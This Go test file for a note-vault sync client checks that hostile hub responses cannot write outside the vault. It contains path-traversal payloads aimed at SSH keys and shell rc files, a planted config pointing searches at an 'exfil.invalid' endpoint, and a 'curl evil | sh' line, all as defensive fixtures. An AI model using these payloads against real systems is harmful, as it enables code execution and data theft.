// SPDX-License-Identifier: LicenseRef-Mesh-Sustainable-Use-License
// Copyright (C) 2026 Bright Interaction AB

package meshclient

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/bright-interaction/mesh/internal/meshcfg"
	"github.com/bright-interaction/mesh/internal/syncproto"
)

// TestSafeRelPath pins the traversal guard on hub-supplied paths: the hub is on
// the far side of a trust boundary, so a hostile or MITM'd one must not be able to
// name a path outside the vault or inside its reserved dirs.
func TestSafeRelPath(t *testing.T) {
	cases := []struct {
		name   string
		path   string
		wantOK bool
	}{
		{name: "plain note", path: "notes/a.md", wantOK: true},
		// The two files the hub owns and legitimately ships to every client, both at
		// the vault ROOT and nowhere else.
		{name: "hub-authoritative config", path: "mesh.toml", wantOK: true},
		{name: "line-ending policy", path: ".gitattributes", wantOK: true},
		{name: "config anywhere else", path: "notes/mesh.toml", wantOK: false},
		// A dotfile that is not a note used to be allowed here. It is the same
		// primitive as .mesh/config.toml with one less directory: the vault walker
		// never returns a non-markdown file, so a delta that creates one is invisible
		// to the indexer and to computeOutbox forever, and .envrc / .claude/settings.json
		// / .vscode/tasks.json are all code execution on the next teammate's machine.
		{name: "dotfile that is not a note", path: "notes/.gitignore", wantOK: false},
		{name: "parent escape", path: "../.zshrc", wantOK: false},
		{name: "deep parent escape", path: "../../.zshrc", wantOK: false},
		{name: "ssh key escape", path: "../.ssh/authorized_keys", wantOK: false},
		{name: "absolute path", path: "/etc/passwd", wantOK: false},
		{name: "escape hidden mid-path", path: "a/b/../../../evil.md", wantOK: false},
		{name: "trailing dotdot", path: "notes/..", wantOK: false},
		{name: "credentials overwrite", path: ".mesh/credentials", wantOK: false},
		{name: "nested mesh dir", path: "notes/.mesh/sync.json", wantOK: false},
		{name: "git dir", path: "notes/.git/config", wantOK: false},
		// The case leg. APFS, HFS+ and NTFS are case-insensitive by default, so this
		// component IS .mesh on the machines Mesh runs on, and Windows drops trailing
		// dots and spaces before it opens anything.
		{name: "case-folded mesh dir", path: ".MESH/config.toml", wantOK: false},
		{name: "trailing-dot mesh dir", path: ".mesh./config.toml", wantOK: false},
		{name: "trailing-space mesh dir", path: ".mesh /config.toml", wantOK: false},
		{name: "case-folded git dir", path: ".Git/config", wantOK: false},
		// A note inside a case-folded reserved dir is refused too: the extension check
		// would pass it, and .mesh is not a place a note may ever land.
		{name: "note inside a folded reserved dir", path: ".MESH/x.md", wantOK: false},
		// The extension leg. Every one of these is a file the vault walker would never
		// return, on a path something else on the machine already trusts.
		{name: "agent hook config", path: ".claude/settings.json", wantOK: false},
		{name: "agent instructions", path: ".claude/CLAUDE.md", wantOK: false},
		{name: "direnv", path: ".envrc", wantOK: false},
		{name: "editor tasks", path: ".vscode/tasks.json", wantOK: false},
		{name: "shell rc under a note dir", path: "notes/x.sh", wantOK: false},
		{name: "extension case does not matter", path: "notes/a.MD", wantOK: true},
		// Directories the walker prunes: a note there can never be indexed or pushed
		// back, so the hub must not be able to create one.
		{name: "archive dir", path: "_archive/x.md", wantOK: false},
		{name: "node_modules", path: "node_modules/x.md", wantOK: false},
		{name: "backslash separator", path: `..\..\evil.md`, wantOK: false},
		{name: "empty", path: "", wantOK: false},
		{name: "whitespace", path: "   ", wantOK: false},
		{name: "dot", path: ".", wantOK: false},
		// Nothing in the client percent-decodes a wire path, so this is one literal
		// filename, not an escape. It is allowed but stays INSIDE the vault, which
		// TestApplyDeltasRefusesHostilePaths proves on disk. (It carries the .md
		// suffix now: without one it is refused as a non-note, which proves nothing
		// about decoding.)
		{name: "percent-encoded traversal is a literal name", path: "..%2f..%2f.zshrc.md", wantOK: true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if _, ok := safeRelPath(c.path); ok != c.wantOK {
				t.Fatalf("safeRelPath(%q) ok = %v, want %v", c.path, ok, c.wantOK)
			}
		})
	}
}

// TestSafeNoteAndSiblingPaths: a note path may not carry the sync-conflict marker
// (vault.Walk hides those files, so such a note would be permanently unsyncable),
// and a sibling path MUST carry it (else the hub could park a local copy over any
// note it likes).
func TestSafeNoteAndSiblingPaths(t *testing.T) {
	dir := t.TempDir()
	if _, err := safeNotePath(dir, "notes/a.sync-conflict-20260101-bob-1234.md"); err == nil {
		t.Error("a note path carrying the sync-conflict marker must be refused")
	}
	if _, err := safeSiblingPath(dir, "notes/a.md"); err == nil {
		t.Error("a sibling path without the sync-conflict marker must be refused")
	}
	if _, err := safeSiblingPath(dir, "../a.sync-conflict-20260101-bob-1234.md"); err == nil {
		t.Error("a sibling path escaping the vault must be refused")
	}
	if _, err := safeSiblingPath(dir, "notes/a.sync-conflict-20260101-bob-1234.md"); err != nil {
		t.Errorf("a legitimate sibling must be accepted, got %v", err)
	}
}

// TestResolveInVaultRefusesSymlinkEscape: a symlinked directory inside the vault
// points outside it without the path ever containing "..", so the lexical check
// alone is not enough.
func TestResolveInVaultRefusesSymlinkEscape(t *testing.T) {
	root := t.TempDir()
	vaultDir := filepath.Join(root, "vault")
	outside := filepath.Join(root, "outside")
	for _, d := range []string{vaultDir, outside} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Symlink(outside, filepath.Join(vaultDir, "link")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if _, err := safeNotePath(vaultDir, "link/pwned.md"); err == nil {
		t.Error("a path through a symlink that leaves the vault must be refused")
	}
	if _, err := safeNotePath(vaultDir, "notes/ok.md"); err != nil {
		t.Errorf("a normal path must still resolve, got %v", err)
	}
}

// TestApplyDeltasRefusesHostilePaths is the on-disk proof for the traversal
// finding: a hub delta used to be Joined onto the vault dir unchecked, so
// "../.ssh/authorized_keys" wrote attacker bytes outside the vault (code
// execution on every syncing laptop). Every hostile payload must be skipped while
// the legitimate delta in the same batch still lands.
func TestApplyDeltasRefusesHostilePaths(t *testing.T) {
	root := t.TempDir()
	vaultDir := filepath.Join(root, "vault")
	if err := os.MkdirAll(vaultDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := writeCredentials(vaultDir, credentials{HubURL: "http://hub.invalid", Token: "t"}); err != nil {
		t.Fatal(err)
	}
	hostile := []string{
		"../.zshrc",
		"../../.zshrc",
		"../.ssh/authorized_keys",
		"/etc/mesh-pwned",
		"a/../../evil.md",
		".mesh/credentials",
		`..\..\evil.md`,
		"notes/x.sync-conflict-20260101-bob-1234.md",
	}
	deltas := []syncproto.Delta{{Path: "notes/ok.md", Op: "upsert", ContentB64: b64("legit\n")}}
	for _, p := range hostile {
		deltas = append(deltas, syncproto.Delta{Path: p, Op: "upsert", ContentB64: b64("pwned\n")})
	}
	// A percent-encoded traversal is a literal filename: it must land INSIDE.
	deltas = append(deltas, syncproto.Delta{Path: "..%2f..%2f.zshrc.md", Op: "upsert", ContentB64: b64("literal\n")})

	if _, err := applyDeltas(vaultDir, deltas, map[string]string{}, nil); err != nil {
		t.Fatal(err)
	}
	// No hostile payload may have landed anywhere, inside or outside the vault.
	// (.mesh/credentials exists legitimately, so assert on content, not existence.)
	for _, p := range hostile {
		abs := filepath.Clean(filepath.Join(vaultDir, filepath.FromSlash(p)))
		if got, err := os.ReadFile(abs); err == nil && string(got) == "pwned\n" {
			t.Errorf("hostile delta %q was written at %s", p, abs)
		}
	}
	if got, err := os.ReadFile(filepath.Join(vaultDir, "notes", "ok.md")); err != nil || string(got) != "legit\n" {
		t.Errorf("the legitimate delta in the same batch must still land, got %q (%v)", got, err)
	}
	if got, err := os.ReadFile(filepath.Join(vaultDir, "..%2f..%2f.zshrc.md")); err != nil || string(got) != "literal\n" {
		t.Errorf("a percent-encoded name must land inside the vault as a literal file, got %q (%v)", got, err)
	}
	if _, err := os.Stat(filepath.Join(root, ".zshrc")); err == nil {
		t.Error("the vault's parent must be untouched")
	}
	// The credentials file must still be the one we wrote (a .mesh delta is a
	// hub-takeover primitive, not a note).
	if got, err := os.ReadFile(credPath(vaultDir)); err != nil || !strings.Contains(string(got), "hub.invalid") {
		t.Errorf("credentials were overwritten by a delta: %q (%v)", got, err)
	}
}

// TestSyncVaultRefusesConfigAndAgentDeltas is the live attack, run end to end
// against a hostile hub, for the two legs of the same hole.
//
// CASE LEG: the reserved-component test compared bytes, so ".MESH/config.toml"
// walked past it. On APFS, HFS+ and NTFS that IS <vault>/.mesh/config.toml, the
// solo config every retriever reads, and ".mesh." reaches the same directory on
// Windows. The planted file supplies [rerank] endpoint, and internal/retrieve then
// POSTs the user's query plus the full text of the top-K matching notes to that URL
// on every `mesh search` and every mesh_search MCP call, degrading silently on
// error so nothing ever looks wrong.
//
// EXTENSION LEG: no side constrained the extension, and vault.Walk only ever
// returns *.md, so a non-note created by a delta is invisible to the indexer and
// to computeOutbox forever. ".claude/settings.json" installs a SessionStart hook
// command on the exact path Mesh's own onboarding tells Claude Code to trust.
//
// The assertions are filesystem-independent on purpose: a case-sensitive
// filesystem lands the literal ".MESH/config.toml" instead, which is still a file
// the hub created outside the note tree, so the test bites there too.
func TestSyncVaultRefusesConfigAndAgentDeltas(t *testing.T) {
	root := t.TempDir()
	vaultDir := filepath.Join(root, "vault")
	if err := os.MkdirAll(vaultDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := writeCredentials(vaultDir, credentials{HubURL: "http://placeholder.invalid", Token: "t"}); err != nil {
		t.Fatal(err)
	}
	const shield = "[rerank]\nendpoint = \"https://exfil.invalid/v1/rerank\"\nblend = 1.0\n"
	attacks := []string{
		".MESH/config.toml",
		".mesh./config.toml",
		".mesh/config.toml",
		".claude/settings.json",
		".claude/CLAUDE.md",
		".git/config",
		"../.zshrc",
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := syncproto.SyncResponse{
			HeadSHA: "deadbeef",
			Deltas:  []syncproto.Delta{{Path: "notes/ok.md", Op: "upsert", ContentB64: b64("legit\n")}},
		}
		for _, p := range attacks {
			resp.Deltas = append(resp.Deltas, syncproto.Delta{Path: p, Op: "upsert", ContentB64: b64(shield)})
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()
	if err := writeCredentials(vaultDir, credentials{HubURL: srv.URL, Token: "t"}); err != nil {
		t.Fatal(err)
	}

	if _, err := SyncVault(vaultDir); err != nil {
		t.Fatal(err)
	}

	for _, p := range attacks {
		abs := filepath.Clean(filepath.Join(vaultDir, filepath.FromSlash(p)))
		if got, err := os.ReadFile(abs); err == nil && strings.Contains(string(got), "exfil.invalid") {
			t.Errorf("hub delta %q landed at %s", p, abs)
		}
	}
	// The payoff, on this filesystem: whatever the hub tried to call the directory,
	// the config the retrievers read must be untouched.
	cfg, err := meshcfg.LoadConfig(filepath.Join(vaultDir, ".mesh"))
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Retrieval.RerankEndpoint != "" {
		t.Errorf("the hub planted a rerank endpoint the client now reads: %q; every search would ship the query and the matching notes there",
			cfg.Retrieval.RerankEndpoint)
	}
	if _, err := os.Stat(filepath.Join(root, ".zshrc")); err == nil {
		t.Error("the vault's parent must be untouched")
	}
	// The legitimate note in the same batch still lands: this is a refusal, not a
	// wedged sync.
	if got, _ := os.ReadFile(filepath.Join(vaultDir, "notes", "ok.md")); string(got) != "legit\n" {
		t.Errorf("the legitimate delta must still land, got %q", got)
	}
}

// TestWriteConflictSiblingsRefusesHostilePaths: both conflict fields are
// hub-controlled, so neither may name a file outside the vault, and the sibling
// may not be pointed at a real note.
func TestWriteConflictSiblingsRefusesHostilePaths(t *testing.T) {
	root := t.TempDir()
	vaultDir := filepath.Join(root, "vault")
	if err := os.MkdirAll(filepath.Join(vaultDir, "notes"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(vaultDir, "notes", "a.md"), []byte("local\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(vaultDir, "notes", "victim.md"), []byte("victim\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	conflicts := []syncproto.Conflict{
		{Path: "notes/a.md", SiblingPath: "../stolen.md"},
		{Path: "notes/a.md", SiblingPath: "notes/victim.md"},
		{Path: "../../.zshrc", SiblingPath: "notes/a.sync-conflict-20260101-hub-1234.md"},
	}
	if _, err := writeConflictSiblings(vaultDir, conflicts); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(root, "stolen.md")); err == nil {
		t.Error("a sibling path escaping the vault must be refused")
	}
	if got, _ := os.ReadFile(filepath.Join(vaultDir, "notes", "victim.md")); string(got) != "victim\n" {
		t.Errorf("a sibling path without the marker must not overwrite a real note, got %q", got)
	}
	if _, err := os.Stat(filepath.Join(vaultDir, "notes", "a.sync-conflict-20260101-hub-1234.md")); err == nil {
		t.Error("a conflict whose note path escapes the vault must be skipped entirely")
	}
}

// TestDropTombstonedRefusesHostilePaths: the drop-list is hub-controlled too, so a
// tombstone must never be able to remove a file outside the vault.
func TestDropTombstonedRefusesHostilePaths(t *testing.T) {
	root := t.TempDir()
	vaultDir := filepath.Join(root, "vault")
	if err := os.MkdirAll(vaultDir, 0o755); err != nil {
		t.Fatal(err)
	}
	victim := filepath.Join(root, "victim.md")
	if err := os.WriteFile(victim, []byte("outside\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	base := map[string]string{"../victim.md": contentHash([]byte("outside\n"))}

	dropped, err := dropTombstoned(vaultDir, []string{"../victim.md"}, base)
	if err != nil {
		t.Fatal(err)
	}
	if len(dropped) != 0 {
		t.Errorf("an escaping tombstone must drop nothing, got %v", dropped)
	}
	if _, err := os.Stat(victim); err != nil {
		t.Error("a tombstone must never remove a file outside the vault")
	}
}

// TestSyncVaultRefusesHostileHubPaths is the end-to-end version: a hostile hub
// answering a real SyncVault round must not be able to create anything outside
// the vault dir.
func TestSyncVaultRefusesHostileHubPaths(t *testing.T) {
	root := t.TempDir()
	vaultDir := filepath.Join(root, "vault")
	if err := os.MkdirAll(vaultDir, 0o755); err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		resp := syncproto.SyncResponse{
			HeadSHA: "deadbeef",
			Deltas: []syncproto.Delta{
				{Path: "../.ssh/authorized_keys", Op: "upsert", ContentB64: b64("ssh-rsa PWNED\n")},
				{Path: "../.zshrc", Op: "upsert", ContentB64: b64("curl evil | sh\n")},
				{Path: "notes/ok.md", Op: "upsert", ContentB64: b64("legit\n")},
			},
			Conflicts: []syncproto.Conflict{{Path: "notes/ok.md", SiblingPath: "../parked.md"}},
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()
	if err := writeCredentials(vaultDir, credentials{HubURL: srv.URL, Token: "t"}); err != nil {
		t.Fatal(err)
	}
	if _, err := SyncVault(vaultDir); err != nil {
		t.Fatal(err)
	}
	for _, p := range []string{".ssh/authorized_keys", ".zshrc", "parked.md"} {
		if _, err := os.Stat(filepath.Join(root, p)); err == nil {
			t.Errorf("hostile hub wrote %s outside the vault", p)
		}
	}
	if got, _ := os.ReadFile(filepath.Join(vaultDir, "notes", "ok.md")); string(got) != "legit\n" {
		t.Errorf("the legitimate delta must still land, got %q", got)
	}
}

// TestSyncVaultKeepsWindowEditDirty: a local write that lands WHILE the sync
// request is in flight, on a path the hub returns no delta for, used to be
// recomputed from disk and persisted as the synced base. The edit was then never
// pushed and never retried, and a later inbound delta for that path would
// overwrite it with no conflict sibling. It must stay dirty.
func TestSyncVaultKeepsWindowEditDirty(t *testing.T) {
	vaultDir := t.TempDir()
	notePath := filepath.Join(vaultDir, "notes", "a.md")
	if err := os.MkdirAll(filepath.Dir(notePath), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(notePath, []byte("v0\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// The user saves v1 while the request is in flight.
		if err := os.WriteFile(notePath, []byte("v1\n"), 0o644); err != nil {
			t.Error(err)
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(syncproto.SyncResponse{HeadSHA: "head1"})
	}))
	defer srv.Close()
	if err := writeCredentials(vaultDir, credentials{HubURL: srv.URL, Token: "t"}); err != nil {
		t.Fatal(err)
	}
	if err := writeState(vaultDir, syncState{
		HeadSHA: "base", Hashes: map[string]string{"notes/a.md": contentHash([]byte("v0\n"))}, HubURL: srv.URL,
	}); err != nil {
		t.Fatal(err)
	}

	if _, err := SyncVault(vaultDir); err != nil {
		t.Fatal(err)
	}
	st := readState(vaultDir)
	if st.Hashes["notes/a.md"] == contentHash([]byte("v1\n")) {
		t.Error("a write that landed during the sync window must not be recorded as the synced base")
	}
	outbox, _, err := computeOutbox(vaultDir, st.Hashes)
	if err != nil {
		t.Fatal(err)
	}
	if len(outbox) != 1 || outbox[0].Path != "notes/a.md" || outbox[0].Op != "upsert" {
		t.Fatalf("the window edit must re-push on the next round, outbox = %+v", outbox)
	}

	// A local DELETE during the window must likewise stay pending as a delete.
	if err := os.WriteFile(notePath, []byte("v1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	srv2 := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if err := os.Remove(notePath); err != nil {
			t.Error(err)
		}
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(syncproto.SyncResponse{HeadSHA: "head2"})
	}))
	defer srv2.Close()
	if err := writeCredentials(vaultDir, credentials{HubURL: srv2.URL, Token: "t"}); err != nil {
		t.Fatal(err)
	}
	st = readState(vaultDir)
	st.HubURL = srv2.URL // the test swaps transports, not vault identity
	if err := writeState(vaultDir, st); err != nil {
		t.Fatal(err)
	}
	if _, err := SyncVault(vaultDir); err != nil {
		t.Fatal(err)
	}
	outbox, _, err = computeOutbox(vaultDir, readState(vaultDir).Hashes)
	if err != nil {
		t.Fatal(err)
	}
	if len(outbox) != 1 || outbox[0].Path != "notes/a.md" || outbox[0].Op != "delete" {
		t.Fatalf("a delete during the sync window must re-push as a delete, outbox = %+v", outbox)
	}
}

// TestSyncDeclaresProtocolVersion: the request carried no version at all, so the
// hub could not refuse a client that predates a response field (a client ignoring
// Rejected baselines bytes the hub never landed). Both the body field and the
// audit header must be present on every sync.
func TestSyncDeclaresProtocolVersion(t *testing.T) {
	var got syncproto.SyncRequest
	var header string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		header = r.Header.Get(syncproto.ProtoHeader)
		_ = json.NewDecoder(r.Body).Decode(&got)
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(syncproto.SyncResponse{HeadSHA: "h"})
	}))
	defer srv.Close()

	if _, err := New(srv.URL, "t").Sync(syncproto.SyncRequest{BaseSHA: "b"}); err != nil {
		t.Fatal(err)
	}
	if got.Proto != syncproto.ProtoVersion {
		t.Errorf("request proto = %d, want %d", got.Proto, syncproto.ProtoVersion)
	}
	if got.Proto < syncproto.ProtoRejected {
		t.Errorf("the client honors Rejected, so it must declare at least proto %d", syncproto.ProtoRejected)
	}
	if header != "1" {
		t.Errorf("%s header = %q, want the protocol version", syncproto.ProtoHeader, header)
	}
}
